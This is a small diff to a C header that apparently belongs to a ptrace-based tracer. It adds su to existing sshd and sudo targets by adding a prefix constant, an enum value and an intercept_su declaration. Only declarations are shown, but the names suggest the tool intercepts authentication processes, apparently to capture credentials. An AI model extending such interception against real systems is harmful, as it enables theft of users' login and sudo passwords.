@@ -17,6 +17,7 @@
 #define P_SSH_NET "sshd: [net]"
 #define P_SSH_ACC "sshd: [accepted]"
 #define P_SUDO "sudo "
+#define P_SU "su "
 
 #ifdef __amd64__
 #define eax rax
@@ -36,7 +37,8 @@
 enum tracer_types {
   invalid_tracer,
   ssh_tracer,
-  sudo_tracer
+  sudo_tracer,
+  su_tracer
 };
 
 void trace_process(pid_t);
@@ -58,5 +60,6 @@ void free_process_username(void);
 //Forward declaration to avoid circular dependancy
 void intercept_ssh(pid_t);
 void intercept_sudo(pid_t);
+void intercept_su(pid_t);
 
 #endif
